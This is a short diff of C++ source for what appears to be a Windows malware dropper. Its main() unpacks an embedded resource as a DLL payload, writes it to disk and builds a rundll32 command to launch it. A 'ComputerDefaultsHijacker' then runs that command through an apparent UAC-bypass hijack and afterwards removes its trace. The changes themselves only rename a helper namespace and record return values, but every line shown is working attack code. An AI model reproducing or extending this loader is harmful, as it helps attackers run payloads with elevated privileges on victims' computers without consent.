@@ -10,12 +10,12 @@
 
 int main()
 {
-	Lib::Init();
+	Wrapper::Init();
 	
 	LPBYTE pData = NULL;
 	DWORD dwDataSize = 0;
-	Lib::GetResourceData(IDR_PKW9JSDH1, L"PKw9jsdH", pData, dwDataSize);
-	Lib::WriteToFile(DLL_PAYLOAD_X86_PATH, pData, dwDataSize);
+	Wrapper::GetResourceData(IDR_PKW9JSDH1, L"PKw9jsdH", pData, dwDataSize);
+	Wrapper::WriteToFile(DLL_PAYLOAD_X86_PATH, pData, dwDataSize);
 	
 	WCHAR wzCommand[MAX_PATH] = {0};
 	StringCbCatW(wzCommand, sizeof(wzCommand), RUNDLL32_PATH);
@@ -23,10 +23,12 @@ int main()
 	StringCbCatW(wzCommand, sizeof(wzCommand), DLL_PAYLOAD_X86_PATH);
 	StringCbCatW(wzCommand, sizeof(wzCommand), L",");
 	StringCbCatW(wzCommand, sizeof(wzCommand), DLL_PAYLOAD_ENTRY_POINT);
+
+	bool bRet = false;
 	
 	ComputerDefaultsHijacker hijacker;
-	hijacker.Install(wzCommand);
-	hijacker.Run();
+	bRet = hijacker.Install(wzCommand);
+	bRet = hijacker.Run();
 	hijacker.Uninstall();
 }
 
